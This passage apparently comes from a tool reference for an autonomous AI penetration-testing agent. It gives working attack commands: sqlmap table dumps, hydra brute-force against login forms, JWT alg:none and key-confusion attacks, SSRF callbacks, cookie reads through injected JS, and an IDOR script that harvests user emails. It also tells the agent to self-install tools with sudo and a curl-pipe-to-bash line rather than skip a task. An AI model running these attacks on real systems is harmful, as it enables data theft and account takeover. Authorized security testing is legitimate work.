# Data extraction
sqlmap -u "https://example.com/user?id=1" --batch -D target_db -T users --dump \
       --output-dir /workspace/example.com/output/sqlmap/

# POST request exploitation
sqlmap -r /workspace/example.com/output/login_request.txt \
       --batch --level 3 --risk 2 \
       --output-dir /workspace/example.com/output/sqlmap/
```

---

### 3.10 Password Attacks & Brute-Force

| Tool | Key flags | Description |
|------|-----------|-------------|
| **hydra** | `-l user -P wordlist http-post-form "url:body:fail_string"` | Multi-protocol login brute-force (HTTP, SSH, FTP, SMB, RDP) |
| **medusa** | `-u user -P wordlist -h host -M http` | Fast parallel login brute-force |
| **hashcat** | `-m 0 hash.txt rockyou.txt` | GPU-accelerated hash cracking (md5=0, sha1=100, bcrypt=3200) |
| **john** | `--wordlist=rockyou.txt --format=raw-md5 hashes.txt` | CPU hash cracker with many format presets |

**Available wordlists:**

```bash
/usr/share/wordlists/rockyou.txt              # 14M password list
/usr/share/seclists/Passwords/                # Curated password lists
/usr/share/seclists/Usernames/                # Username lists
/usr/share/seclists/Fuzzing/                  # General fuzzing strings
```

**Hydra HTTP form login:**

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
    example.com http-post-form \
    "/login:username=^USER^&password=^PASS^:Invalid credentials" \
    -t 16 -o /workspace/example.com/output/hydra_login.txt
```

---

### 3.11 CMS Scanners

| Tool | Key flags | Description |
|------|-----------|-------------|
| **wpscan** | `--url URL --enumerate p,u,t --api-token TOKEN` | WordPress: plugins, users, themes, CVEs |
| **joomscan** | `-u URL` | Joomla vulnerability scanner |

```bash
# WordPress full enumeration
wpscan --url https://example.com \
       --enumerate p,u,t,cb,dbe \
       --plugins-detection aggressive \
       -o /workspace/example.com/output/wpscan.txt

# Joomla scan
joomscan -u https://example.com \
         -ec \
         --output /workspace/example.com/output/joomscan.txt
```

---

### 3.12 Secret & Code Analysis

| Tool | Key flags | Description |
|------|-----------|-------------|
| **gitleaks** | `detect --source . --report-path output/gitleaks.json` | Git repository secret scanner |
| **trufflehog** | `git https://github.com/org/repo` or `filesystem /path` | Deep entropy-based secret detection |
| **git-secrets** | `--scan` | Prevent committing secrets to git |
| **git-dumper** | `URL output/git_dump/` | Dump exposed `.git` directories |
| **gf** | `<pattern> < urls.txt` | Pattern grep: `secrets`, `sqli`, `xss`, `ssrf`, `lfi`, `idor`, etc. |
| **semgrep** | `--config p/security-audit .` | SAST with OWASP rule sets |
| **bandit** | `-r /path -f json -o output/bandit.json` | Python-specific security issues (hardcoded passwords, `eval`, `exec`) |

**gf patterns available:**

```bash
# List available patterns
ls ~/.gf/
# Output: aws-keys.json  base64.json  cors.json  debug-pages.json
#         idor.json  interestingparams.json  lfi.json  rce.json
#         redirect.json  s3-buckets.json  sqli.json  ssrf.json  xss.json

# Usage
cat /workspace/example.com/output/urls_all.txt | gf xss | tee xss_candidates.txt
cat /workspace/example.com/output/urls_all.txt | gf sqli | tee sqli_candidates.txt
cat /workspace/example.com/output/urls_all.txt | gf ssrf | tee ssrf_candidates.txt
```

---

### 3.13 GraphQL & JWT Testing

| Tool | Location | Description |
|------|----------|-------------|
| **inql** | pipx | GraphQL introspection, schema analysis, batch attack detection |
| **GraphQLmap** | `/home/pentester/tools/GraphQLmap/graphqlmap.py` | Interactive GraphQL injection and enumeration |
| **jwt_tool** | `/home/pentester/tools/jwt_tool/jwt_tool.py` | Full JWT attack suite |
| **jwt-cracker** | npm global | Brute-force JWT HMAC secrets |

**JWT testing with jwt_tool:**

```bash
TOKEN="eyJhbGc..."

# Test alg:none bypass
python3 /home/pentester/tools/jwt_tool/jwt_tool.py $TOKEN -X a

# Brute-force HMAC secret
python3 /home/pentester/tools/jwt_tool/jwt_tool.py $TOKEN -C -d /usr/share/wordlists/rockyou.txt

# RS256 → HS256 confusion attack (requires public key)
python3 /home/pentester/tools/jwt_tool/jwt_tool.py $TOKEN -X k -pk public_key.pem

# kid injection (SQL)
python3 /home/pentester/tools/jwt_tool/jwt_tool.py $TOKEN -I -hc kid -hv "../../dev/null"

# Full interactive mode
python3 /home/pentester/tools/jwt_tool/jwt_tool.py $TOKEN --mode pb  # playbook mode
```

**GraphQL testing:**

```bash
# Schema introspection
inql -t https://example.com/graphql

# GraphQLmap interactive
python3 /home/pentester/tools/GraphQLmap/graphqlmap.py \
    --url https://example.com/graphql \
    --headers '{"Authorization": "Bearer TOKEN"}' \
    --dump-new

# Manual introspection via curl
curl -s -X POST https://example.com/graphql \
    -H "Content-Type: application/json" \
    -d '{"query":"{ __schema { types { name fields { name } } } }"}' \
    | jq . | tee /workspace/example.com/output/graphql_schema.json
```

---

### 3.14 SSL/TLS & Crypto

| Tool | Key flags | Description |
|------|-----------|-------------|
| **testssl.sh** | `--parallel --severity HIGH URL` | Comprehensive TLS audit: Heartbleed, BEAST, POODLE, ROBOT, weak ciphers |
| **tlsx** | `-l hosts -version -cipher -san -cn` | Fast multi-host TLS fingerprinting |

```bash
# Full TLS audit
testssl.sh --parallel --severity HIGH \
           --jsonfile /workspace/example.com/output/testssl.json \
           https://example.com

# Check for Heartbleed specifically
testssl.sh --heartbleed https://example.com
```

---

### 3.15 Cloud & S3 Recon

| Tool | Key flags | Description |
|------|-----------|-------------|
| **s3scanner** | `scan --bucket-file buckets.txt` | S3 bucket permission testing |
| **festin** | `-d example.com` | Hidden S3 bucket discovery via DNS, SSL certs |
| **shodan** | `search apache 2.4 port:443 org:example` | Internet-wide service search (requires API key in env) |

```bash
# Generate bucket name candidates
echo "example.com" | sed 's/\./-/g' > /tmp/bucket_names.txt
cat >> /tmp/bucket_names.txt << 'EOF'
example
example-backup
example-dev
example-staging
example-assets
example-static
EOF

# Scan for open buckets
s3scanner scan --bucket-file /tmp/bucket_names.txt \
              --threads 10 \
              --out-file /workspace/example.com/output/s3_scan.txt

# DNS/SSL-based discovery
festin -d example.com -f /workspace/example.com/output/festin_buckets.txt
```

---

### 3.16 Proxy & Traffic Interception

| Tool | Description |
|------|-------------|
| **caido-setup** | Shell alias — boots the headless Caido web proxy on port 48080, outputs GraphQL API Bearer token |
| **caido-cli** | Caido command-line interface for replay, intercept, and automation |
| **zaproxy** | OWASP ZAP web application security scanner |

**Caido workflow:**

```bash
# 1. Boot Caido and get the API token
caido-setup
# Outputs: Token: eyJhbGc...  → save this

# 2. Send traffic through Caido proxy
curl -x http://localhost:48080 -k https://example.com/api/user?id=1

# 3. Replay and tamper via GraphQL API
curl -s -X POST http://localhost:48080/graphql \
    -H "Authorization: Bearer TOKEN_FROM_SETUP" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ requests(first: 10) { edges { node { id url method } } } }"}'

# 4. Modify and replay a captured request
caido-cli replay --id REQUEST_ID --param id=2
```

---

### 3.17 Scripting & Utility

| Tool | Description |
|------|-------------|
| **python3** | Full Python 3 with `requests`, `aiohttp`, `beautifulsoup4`, `lxml`, `pycryptodome` pre-installed |
| **bash** | GNU bash with all standard utilities |
| **curl** | HTTP client with full TLS, redirect, header control |
| **wget** | HTTP/FTP downloader |
| **jq** | JSON processor — parse, filter, transform JSON output |
| **ripgrep** (`rg`) | Ultra-fast grep for searching scan output |
| **parallel** | GNU parallel — run commands concurrently |
| **tmux** | Terminal multiplexer — manage parallel long-running scans |

**jq for parsing tool output:**

```bash
# Parse httpx JSON output
cat /workspace/example.com/output/httpx_detailed.json | \
    jq -r 'select(.status_code==200) | .url' > live_200.txt

# Extract nuclei critical findings
cat /workspace/example.com/output/nuclei_results.json | \
    jq -r 'select(.info.severity=="critical") | "\(.info.name) | \(.matched_at)"'

# Parse subfinder JSON
subfinder -d example.com -json | jq -r '.host' | sort -u
```

---

### 3.18 Wordlists & Payloads

**SecLists** — Full collection at `/usr/share/seclists/`:

```
/usr/share/seclists/
├── Discovery/
│   ├── Web-Content/            # Directory and filename wordlists
│   │   ├── raft-large-directories.txt      # 62K directory names
│   │   ├── raft-large-files.txt            # 37K filenames
│   │   ├── burp-parameter-names.txt        # 6K parameter names
│   │   ├── api/api-endpoints.txt           # API endpoint paths
│   │   └── common.txt, big.txt             # Common lists
│   └── DNS/
│       ├── subdomains-top1million-5000.txt
│       └── deepmagic.com-prefixes-top500.txt
├── Passwords/
│   ├── Common-Credentials/10-million-password-list-top-1000.txt
│   └── darkweb2017-top10000.txt
├── Usernames/Names/names.txt
└── Fuzzing/
    ├── SQLi/                   # SQL injection payloads
    ├── XSS/                    # XSS payloads
    ├── SSRF/                   # SSRF URLs and bypass strings
    └── LFI/                    # Local file inclusion payloads
```

**FuzzDB** — Structured attack payloads at `/home/pentester/wordlists/fuzzdb/`:

```
/home/pentester/wordlists/fuzzdb/
├── attack/                     # Attack payloads by type
│   ├── sql-injection/
│   ├── xss/
│   ├── path-traversal/
│   ├── os-cmd-execution/
│   └── ...
└── discovery/                  # Discovery strings
    ├── predictable-filepaths/
    └── ...
```

**NSE Scripts** at `/usr/share/nmap/scripts/` — 600+ Nmap Scripting Engine scripts.

---

## 4. Git-Cloned Tool Scripts

All git-cloned tools are at `/home/pentester/tools/`. Run `ls /home/pentester/tools/` to see the full list.

| Tool | Path | Usage |
|------|------|-------|
| **JWT Tool** | `/home/pentester/tools/jwt_tool/jwt_tool.py` | `python3 jwt_tool.py TOKEN -X a` |
| **GraphQLmap** | `/home/pentester/tools/GraphQLmap/graphqlmap.py` | `python3 graphqlmap.py --url URL` |
| **Corsy** | `/home/pentester/tools/Corsy/corsy.py` | `python3 corsy.py -u https://example.com` |
| **JS-Snooper** | `/home/pentester/tools/JS-Snooper/js_snooper.sh` | `bash js_snooper.sh https://example.com` |
| **jsniper.sh** | `/home/pentester/tools/jsniper.sh/jsniper.sh` | `bash jsniper.sh example.com` |
| **LinkFinder** | `/home/pentester/tools/LinkFinder/linkfinder.py` | `python3 linkfinder.py -i URL -o output.txt` |
| **LinksDumper** | `/home/pentester/tools/LinksDumper/LinksDumper.py` | `python3 LinksDumper.py -u URL` |
| **jsfinder** | `/home/pentester/tools/jsfinder/jsfinder.py` | `python3 jsfinder.py -u URL -l 3` |
| **JS-Scan** | `/home/pentester/tools/JS-Scan/` | `python3 JS-Scan/main.py -u URL` |
| **GitHunter** | `/home/pentester/tools/GitHunter/` | Find exposed `.git` directories |
| **postMessage-tracker** | `/home/pentester/tools/postMessage-tracker/` | Track `window.postMessage` flows |
| **PostMessage_Fuzz_Tool** | `/home/pentester/tools/PostMessage_Fuzz_Tool/` | Fuzz postMessage listeners for DOM XSS |
| **PayloadsAllTheThings** | `/home/pentester/tools/PayloadsAllTheThings/` | Payload reference for all vuln types |

---

## 5. Tool PATH Reference

The container sets a comprehensive `PATH` environment for every `execute` call:

```
/home/pentester/go/bin          ← Go tools: httpx, katana, subfinder, dnsx, nuclei, ...
/home/pentester/.local/bin      ← pipx tools: arjun, dirsearch, wafw00f, ghauri, inql, ...
/home/pentester/.npm-global/bin ← npm globals: wappalyzer, retire, jwt-cracker, eslint, ...
/usr/local/sbin
/usr/local/bin                  ← testssl.sh, custom scripts
/usr/sbin
/usr/bin                        ← Kali packages: nmap, nikto, wpscan, joomscan, hydra, ...
/sbin
/bin
```

If a tool is not found, check `which <tool>` first. If missing, install it — see [Self-Install Capability](#6-self-install-capability).

---

## 6. Self-Install Capability

The agent runs as `pentester` with full `sudo` access and internet connectivity inside the Docker container. If a needed tool is missing, it must install it and continue — **skipping tasks is not acceptable**.

```bash
# System packages (Kali apt)
sudo apt-get install -y <package>

# Python CLI tools (isolated installs)
pipx install <package>
pip3 install <package>

# Go tools (installs to ~/go/bin, in PATH)
go install github.com/<org>/<repo>/cmd/<tool>@latest

# Node.js CLI tools (installs to ~/.npm-global/bin, in PATH)
npm install -g <package>

# Git-cloned tools
git clone https://github.com/<org>/<repo>.git /home/pentester/tools/<name>

# Binary downloads
wget https://example.com/tool -O /tmp/tool && chmod +x /tmp/tool && sudo mv /tmp/tool /usr/local/bin/

# Curl-pipe installs (for official installers)
curl -fsSL https://example.com/install.sh | bash
```

**Install examples used frequently:**

```bash
pip3 install requests beautifulsoup4 lxml aiohttp pycryptodome
go install github.com/projectdiscovery/katana/cmd/katana@latest
go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
sudo apt-get install -y nikto masscan
git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git /home/pentester/tools/PayloadsAllTheThings
```

---

## 7. Tool Usage Patterns

### Pattern 1: Full Recon Chain

```
subfinder / amass / assetfinder
         ↓
     cat | sort -u
         ↓
    dnsx (resolve)
         ↓
    httpx (live probe + tech detect)
         ↓
  katana + gospider + gau + waybackurls (crawl)
         ↓
    gf patterns → candidate URL lists
         ↓
   ffuf / arjun / x8 (param discovery)
         ↓
  jsleak + jsluice + LinkFinder (JS analysis)
         ↓
  nuclei + nikto + dalfox + sqlmap (vuln scan)
         ↓
  browser_action (manual verification)
         ↓
  create_vulnerability_report (confirmed findings only)
```

### Pattern 2: XSS Hunting Pipeline

```bash
# 1. Collect URLs
cat /workspace/example.com/output/urls_all.txt | gf xss > xss_candidates.txt

# 2. Automated scan
dalfox file xss_candidates.txt --output /workspace/example.com/output/xss_dalfox.txt --waf-evasion

# 3. Manual verification of findings
browser_action(action="goto", url="FINDING_URL")
browser_action(action="execute_js", js_code="document.cookie")

# 4. Report with PoC
create_vulnerability_report(title="Reflected XSS in ...", poc_request="...", poc_response="...")
```

### Pattern 3: API Security Testing

```bash
# 1. Discover API endpoints
katana -u https://api.example.com -depth 3 -js-crawl -o urls.txt
arjun -u https://api.example.com/users -oJ params.json

# 2. Swagger/OpenAPI discovery
ffuf -u https://api.example.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/swagger.txt

# 3. Authentication testing
python3 /home/pentester/tools/jwt_tool/jwt_tool.py TOKEN -X a

# 4. IDOR testing
python3 /workspace/example.com/tools/idor_bruteforce.py

# 5. Nuclei API templates
nuclei -u https://api.example.com -tags api,token,exposure -severity medium,high,critical
```

### Pattern 4: Blind Vulnerability Testing (SSRF/XXE/RCE)

```bash
# 1. Start OOB listener
interactsh-client -server oast.fun -n 5 > /workspace/example.com/output/oob_urls.txt &

# 2. Get a callback URL
OOB_URL=$(head -1 /workspace/example.com/output/oob_urls.txt)

# 3. Inject into parameters
curl -s "https://example.com/fetch?url=http://$OOB_URL"

# 4. Monitor for callbacks (shown in interactsh-client terminal output)
# Callback received = SSRF confirmed
```

### Pattern 5: Custom Script for Complex Logic

```python
#!/usr/bin/env python3
# workspace/example.com/tools/idor_bruteforce.py
import sys
import requests
import json

TARGET = sys.argv[1] if len(sys.argv) > 1 else "https://example.com"
HEADERS = {"Authorization": "Bearer VICTIM_TOKEN"}
results = []

for user_id in range(1, 1001):
    r = requests.get(f"{TARGET}/api/users/{user_id}", headers=HEADERS, timeout=5)
    if r.status_code == 200 and r.json().get("email"):
        results.append(f"ID {user_id}: {r.json()['email']} — EXPOSED")
        print(results[-1])

with open("output/idor_results.txt", "w") as f:
    f.write("\n".join(results))
```

```bash
# Run it
python3 /workspace/example.com/tools/idor_bruteforce.py https://example.com
```
